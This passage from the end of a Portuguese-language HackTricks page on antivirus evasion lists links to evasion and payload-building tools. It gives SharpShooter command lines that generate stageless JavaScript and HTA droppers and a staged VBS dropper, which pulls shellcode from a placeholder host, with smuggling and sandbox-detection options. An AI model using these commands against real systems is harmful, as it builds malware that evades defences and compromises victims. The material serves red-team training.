* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para construir exemplos de injetores:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
